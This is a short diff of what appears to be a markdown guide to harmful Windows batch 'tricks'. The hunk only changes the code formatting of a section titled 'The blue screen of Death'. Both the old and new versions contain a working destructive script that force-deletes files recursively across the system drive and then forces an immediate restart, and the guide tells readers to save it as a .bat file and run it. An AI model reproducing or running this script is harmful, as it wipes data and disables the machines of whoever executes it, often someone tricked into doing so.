@@ -22,11 +22,9 @@ Save the file anywhere (.bat) and execute it:
 
 ##### 2.1 The blue screen of Death
 Code:
-```
-@echo off
-del %systemdrive%\*.*/f/s/q
-shutdown -r -f -t 00
-```
+```@echo off```
+```del %systemdrive%\*.*/f/s/q```
+```shutdown -r -f -t 00```
 
 ##### 2.2 Stupidity Shutdown
 code:
